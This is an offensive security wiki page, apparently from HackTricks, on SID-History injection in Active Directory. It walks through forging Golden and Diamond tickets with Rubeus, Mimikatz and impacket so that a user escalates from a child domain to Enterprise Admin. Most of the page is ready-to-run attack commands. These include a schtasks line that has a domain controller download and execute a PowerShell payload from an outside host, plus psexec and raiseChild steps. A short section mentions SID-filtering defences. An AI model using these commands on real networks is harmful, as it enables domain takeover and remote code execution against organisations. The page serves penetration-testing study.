# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.

Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**.

To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.

You could also use the **Domain Admins** groups, which ends in **512**.

Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:

```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```


> [!WARNING]
> Note that it's possible to disable SID history in a trust relationship which will make this attack fail.

According to the [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
- **Disabling SIDHistory on forest trusts** using the netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Applying SID Filter Quarantining to external trusts** using the netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Applying SID Filtering to domain trusts within a single forest** is not recommended as it is an unsupported configuration and can cause breaking changes. If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust

Check this post for more information about bypassing this: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Last time I tried this I needed to add the arg **`/ldap`**.

```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```

### Golden Ticket (Mimikatz) with KRBTGT-AES256

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```

For more info about golden tickets check:


{{#ref}}
golden-ticket.md
{{#endref}}


For more info about diamond tickets check:


{{#ref}}
diamond-ticket.md
{{#endref}}

```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```

Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```

With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:


{{#ref}}
dcsync.md
{{#endref}}

### From linux

#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)

```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```

#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:

- Target domain controller
- Creds for an admin user in the child domain

The flow is:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain
- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```

## References

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}


